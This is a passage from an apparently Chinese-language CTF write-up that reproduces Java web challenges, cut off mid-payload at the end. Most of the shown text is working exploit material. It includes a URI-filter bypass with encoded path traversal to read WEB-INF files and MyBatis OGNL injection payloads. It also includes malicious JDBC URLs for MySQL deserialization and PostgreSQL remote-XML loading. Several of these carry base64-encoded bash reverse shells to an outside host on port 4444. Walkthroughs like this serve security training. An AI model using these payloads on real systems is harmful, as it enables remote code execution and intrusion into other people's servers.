class="hljs-keyword">if</span> (request.get<span class="hljs-constructor">RequestURI()</span>.contains(<span class="hljs-string">&quot;..&quot;</span>)) &#123;    resp.get<span class="hljs-constructor">Writer()</span>.write(<span class="hljs-string">&quot;blacklist&quot;</span>);    return; &#125; <span class="hljs-keyword">if</span> (request.get<span class="hljs-constructor">RequestURI()</span>.starts<span class="hljs-constructor">With(<span class="hljs-string">&quot;/download&quot;</span>)</span>) &#123;    resp.get<span class="hljs-constructor">Writer()</span>.write(<span class="hljs-string">&quot;unauthorized access&quot;</span>); &#125; <span class="hljs-keyword">else</span> &#123;    chain.<span class="hljs-keyword">do</span><span class="hljs-constructor">Filter(<span class="hljs-params">req</span>, <span class="hljs-params">resp</span>)</span>; &#125;</code></pre></div><p>根据网上的文章可以知道, 直接通过 getRequestURI() 得到的 url 路径存在一些问题, 比如不会自动 urldecode, 也不会进行标准化 (去除多余的 <code>/</code> 和 <code>..</code>)</p><p>这里 <code>..</code> 被过滤了, 所以直接访问 <code>//download</code> 就能绕过, 后面目录穿越下载文件的时候可以将 <code>..</code> 进行一次 url 编码</p><p>然后可以通过 <code>//download?filename=avatar.jpg</code> 下载文件, 但是无法读取 <code>/flag</code> (提示 Permission denied), 那么很明显需要 RCE</p><p>根据题目描述, 网站使用 war 打包</p><p>存在一个 WEB-INF 目录, 目录里面包含编译好的 .class 文件以及 web.xml</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>download?filename=%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e<span class="hljs-regexp">/WEB-INF/</span>web.xml</code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>EvilServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.demo.EvilServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>EvilServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/You_Find_This_Evil_Servlet_a76f02cb8422<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs gdscript3">//download?filename=%2e%2e/WEB-INF/classes/com/example/demo/EvilServlet.class</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> IOException &#123;    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;Evil_Cmd_Arguments_fe37627fed78&quot;</span>);    <span class="hljs-keyword">try</span> &#123;      Runtime.getRuntime().exec(cmd);      resp.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;      resp.getWriter().write(<span class="hljs-string">&quot;error&quot;</span>);    &#125;   &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs fallback">POST /You_Find_This_Evil_Servlet_a76f02cb8422 HTTP/1.1Host: 127.0.0.1:50042Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 143Evil_Cmd_Arguments_fe37627fed78=bash+-c+&#123;echo,YmFzaCAtaSA%2bJiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA%2bJjE%3d&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></pre></div><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122210609455.png" alt="image-20231122210609455"></p><h2 id="YourBatis"><a href="#YourBatis" class="headerlink" title="YourBatis"></a>YourBatis</h2><p>自己看时并没看出什么，感觉只有长得奇怪的SQL查询</p><p>看wp，是动态SQL</p><p><a href="https://www.cnpanda.net/sec/1227.html">https://www.cnpanda.net/sec/1227.html</a></p><p>mybatis组件的动态SQL会导致<code>OGNL注入</code></p><ul><li>@Insert</li><li>@Update</li><li>@Delete</li><li>@Select</li><li>@InsertProvider</li><li>@SelectProvider</li><li>@UpdateProvider</li><li>@DeleteProvider</li></ul><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul><li>mybatis-spring-boot-starter &gt;&#x3D;2.0.1（mybatis-spring-boot-starter组件从2.0.1版本开始支持Provider动态SQL）</li></ul><p>或者</p><ul><li>Mybatis 全版本</li></ul><p>或者</p><ul><li>mybatis-plus-boot-starter &gt;&#x3D;3.1.1</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>mybatis中存在某个SelectProvider</p><div class="code-wrapper"><pre><code class="hljs typescript">  <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">findTeacherByName</span>(<span class="hljs-params"><span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">Object</span>&gt; map</span>) &#123;        <span class="hljs-title class_">String</span> name = (<span class="hljs-title class_">String</span>) map.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;name&quot;</span>);        <span class="hljs-title class_">String</span> s = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-params"></span>) &#123;            &#123;                <span class="hljs-title function_">SELECT</span>(returnSql);                <span class="hljs-title function_">FROM</span>(<span class="hljs-string">&quot;Teacher&quot;</span>);                <span class="hljs-title function_">WHERE</span>(<span class="hljs-string">&quot;name=&quot;</span> + name);            &#125;        &#125;.<span class="hljs-title function_">toString</span>();        <span class="hljs-keyword">return</span> s;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">@<span class="hljs-constructor">RequestMapping(<span class="hljs-string">&quot;selectUserByName&quot;</span>)</span>public Teacher get<span class="hljs-constructor">UserOne(String <span class="hljs-params">id</span>,String <span class="hljs-params">name</span>)</span>&#123;    Teacher tea=<span class="hljs-keyword">new</span> <span class="hljs-constructor">Teacher()</span>;    tea.set<span class="hljs-constructor">Id(<span class="hljs-params">id</span>)</span>;    tea.set<span class="hljs-constructor">Name(<span class="hljs-params">name</span>)</span>;    Teacher teacher=userService.find<span class="hljs-constructor">TeacherByName(<span class="hljs-params">tea</span>)</span>;    return teacher;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//localhost:<span class="hljs-number">8080</span>/selectUserByName?id<span class="hljs-operator">=</span><span class="hljs-number">7</span>&amp;name<span class="hljs-operator">=</span><span class="hljs-variable">%24</span><span class="hljs-variable">%7</span>B<span class="hljs-title">@java.lang.Runtime</span><span class="hljs-title">@getRuntime</span>().exec(<span class="hljs-string">&quot;calc&quot;</span>)<span class="hljs-variable">%7</span>D//$&#123;<span class="hljs-title">@java.lang.Runtime</span><span class="hljs-title">@getRuntime</span>().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;</code></pre></div><p>java环境大于等于jdk9的通杀payload</p><div class="code-wrapper"><pre><code class="hljs autoit">$&#123;<span class="hljs-symbol">@jdk</span>.jshell.JShell<span class="hljs-symbol">@create</span>().<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;java.lang.Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;)&#x27;</span>)&#125;</code></pre></div><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.yourbatis.provider;<span class="hljs-keyword">import</span> org.apache.ibatis.jdbc.SQL;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserSqlProvider</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserSqlProvider</span><span class="hljs-params">()</span> &#123;    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">buildGetUsers</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() &#123;            &#123;                <span class="hljs-built_in">this</span>.SELECT(<span class="hljs-string">&quot;*&quot;</span>);                <span class="hljs-built_in">this</span>.FROM(<span class="hljs-string">&quot;users&quot;</span>);            &#125;        &#125;).toString();    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">buildGetUserByUsername</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String username)</span> &#123;        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() &#123;            &#123;                <span class="hljs-built_in">this</span>.SELECT(<span class="hljs-string">&quot;*&quot;</span>);                <span class="hljs-built_in">this</span>.FROM(<span class="hljs-string">&quot;users&quot;</span>);                <span class="hljs-built_in">this</span>.WHERE(String.format(<span class="hljs-string">&quot;username = &#x27;%s&#x27;&quot;</span>, username));            &#125;        &#125;).toString();    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$&#123;</span><span class="hljs-variable">@java</span>.lang.<span class="hljs-title class_">Runtime</span><span class="hljs-variable">@getRuntime</span>().exec(<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)&#125;</code></pre></div><p>但是很显然是会失败的, 因为传入的命令包含了 <code>&#123;</code> 和 <code>&#125;</code>, 会被递归解析为另一个 OGNL 表达式的开头和结尾</p><p>这个点可能比较难, 所以后面给出了 hint</p><p>解决方案是只要不出现大括号就行, 方法很多, 这里给出一种, 利用 OGNL 调用 Java 自身的 base64 decode 方法</p><div class="code-wrapper"><pre><code class="hljs stylus">$&#123;@java<span class="hljs-selector-class">.lang</span>.Runtime@<span class="hljs-built_in">getRuntime</span>()<span class="hljs-selector-class">.exec</span>(new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span>(@java<span class="hljs-selector-class">.util</span>.Base64@<span class="hljs-built_in">getDecoder</span>()<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TVRndU9Ea3VOakV1TnpFdk56YzNOeUF3UGlZeH18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9&#x27;</span>)))&#125;</code></pre></div><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122224919226.png" alt="image-20231122224919226"></p><h2 id="TestConnect"><a href="#TestConnect" class="headerlink" title="TestConnect"></a>TestConnect</h2><p>怎么说呢，一直听说jdbc，但现在还是感到无力</p><blockquote><p>JDBC 就是 Java 用于操作数据库的接口, 通过一个统一规范的 JDBC 接口可以实现同一段代码兼容不同类型数据库的访问</p><p>JDBC URL 就是用于连接数据库的字符串, 格式为 <code>jdbc:db-type://host:port/db-name?param=value</code></p><p>db-type 就是数据库类型, 例如 postgresql, mysql, mssql, oracle, sqlite</p><p>db-name 是要使用的数据库名</p><p>param 是要传入的参数, 比如 user, password, 指定连接时使用的编码类型等等</p><p>当 jdbc url 可控时, 如果目标网站使用了旧版的数据库驱动, 在特定情况下就可以实现 RCE</p><p>参考文章:</p><p><a href="https://tttang.com/archive/1877/">https://tttang.com/archive/1877/</a></p><p><a href="https://xz.aliyun.com/t/11812">https://xz.aliyun.com/t/11812</a></p><p><a href="https://forum.butian.net/share/1339">https://forum.butian.net/share/1339</a></p><p>pom.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>42.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre></div><p>给了两个依赖, mysql 和 postgresql, 对应两种利用方式</p><p>然后还有 commons-collections 依赖, 这个主要是方便大家在后面用 ysoserial 工具去生成反序列化 payload</p><p>首先是 mysql 驱动的利用</p><p>结合网上文章可以构造对应的 jdbc url</p><div class="code-wrapper"><pre><code class="hljs bash">jdbc:mysql://host.docker.internal:3308/test?autoDeserialize=<span class="hljs-literal">true</span>&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code></pre></div><p>首先得注意, 因为题目给的代码是 <code>DriverManager.getConnection(url, username, password);</code>, 即会单独传入一个 username 参数, 因此 url 中的 username 会被后面的 username 给覆盖</p><p>网上的部分利用工具会通过 username 来区分不同的 payload, 所以得注意 username 要单独传, 不然写在 url 里面就被覆盖了</p><p>其次, 因为 jdbc url 本身也符合 url 的规范, 所以在传 url 参数的时候, 需要把 url 本身全部进行 url 编码, 防止服务器错把 autoDeserialize, queryInterceptors 这些参数当成是一个 http get 参数, 而不是 jdbc url 里面的参数</p><p>最后依然是 Runtime.exec 命令编码的问题</p><p>一些 mysql jdbc 利用工具</p><p><a href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></p><p><a href="https://github.com/rmb122/rogue_mysql_server">https://github.com/rmb122/rogue_mysql_server</a></p><p>payload</p><div class="code-wrapper"><pre><code class="hljs bash">/testConnection?driver=com.mysql.cj.jdbc.Driver&amp;url=jdbc:mysql://host.docker.internal:3308/test?autoDeserialize=<span class="hljs-literal">true</span>&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;username=deser_CC31_bash -c &#123;<span class="hljs-built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=&#125;|&#123;<span class="hljs-built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;&amp;password=123</code></pre></div><p>url 编码</p><div class="code-wrapper"><pre><code class="hljs llvm">/testConnection?driver<span class="hljs-operator">=</span>com.mysql.cj.jdbc.Driver&amp;url<span class="hljs-operator">=</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%63</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%64</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%33</span><span class="hljs-variable">%33</span><span class="hljs-variable">%30</span><span class="hljs-variable">%38</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%44</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%69</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%65</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%75</span><span class="hljs-variable">%65</span><span class="hljs-variable">%26</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%79</span><span class="hljs-variable">%49</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%70</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>d<span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span>a<span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%63</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%70</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%73</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%53</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%53</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%75</span><span class="hljs-variable">%73</span><span class="hljs-variable">%44</span><span class="hljs-variable">%69</span><span class="hljs-variable">%66</span><span class="hljs-variable">%66</span><span class="hljs-variable">%49</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%70</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span>&amp;username<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%43</span><span class="hljs-variable">%43</span><span class="hljs-variable">%33</span><span class="hljs-variable">%31</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%63</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%59</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%46</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%61</span><span class="hljs-variable">%43</span><span class="hljs-variable">%41</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%53</span><span class="hljs-variable">%41</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%4</span>a<span class="hljs-variable">%69</span><span class="hljs-variable">%41</span><span class="hljs-variable">%76</span><span class="hljs-variable">%5</span>a<span class="hljs-variable">%47</span><span class="hljs-variable">%56</span><span class="hljs-variable">%32</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%33</span><span class="hljs-variable">%52</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%63</span><span class="hljs-variable">%43</span><span class="hljs-variable">%39</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%62</span><span class="hljs-variable">%33</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%30</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%52</span><span class="hljs-variable">%76</span><span class="hljs-variable">%59</span><span class="hljs-variable">%32</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%63</span><span class="hljs-variable">%69</span><span class="hljs-variable">%35</span><span class="hljs-variable">%70</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%52</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%35</span><span class="hljs-variable">%68</span><span class="hljs-variable">%62</span><span class="hljs-variable">%43</span><span class="hljs-variable">%38</span><span class="hljs-variable">%30</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%44</span><span class="hljs-variable">%51</span><span class="hljs-variable">%30</span><span class="hljs-variable">%49</span><span class="hljs-variable">%44</span><span class="hljs-variable">%41</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%4</span>a<span class="hljs-variable">%6</span>a<span class="hljs-variable">%45</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%7</span>d<span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%69</span><span class="hljs-variable">%7</span>d&amp;password<span class="hljs-operator">=</span><span class="hljs-number">123</span></code></pre></div></blockquote><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231123154925022.png" alt="image-20231123154925022"></p><h3 id="postgresql-驱动"><a href="#postgresql-驱动" class="headerlink" title="postgresql 驱动"></a>postgresql 驱动</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> &gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><p>payload</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/testConnection?driver=org.postgresql.Driver&amp;url=jdbc:postgresql:/</span><span class="hljs-regexp">/127.0.0.1:5432/</span>test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http:<span class="hljs-regexp">//</span>host.docker.internal:<span class="hljs-number">8000</span>/poc.xml&amp;username=<span class="hljs-number">123</span>&amp;password=<span class="hljs-number">123</span></code></pre></div><p>url 编码</p><div class="code-wrapper"><pre><code class="hljs llvm">/testConnection?driver<span class="hljs-operator">=</span>org.postgresql.Driver&amp;url<span class="hljs-operator">=</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%63</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%67</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>a<span 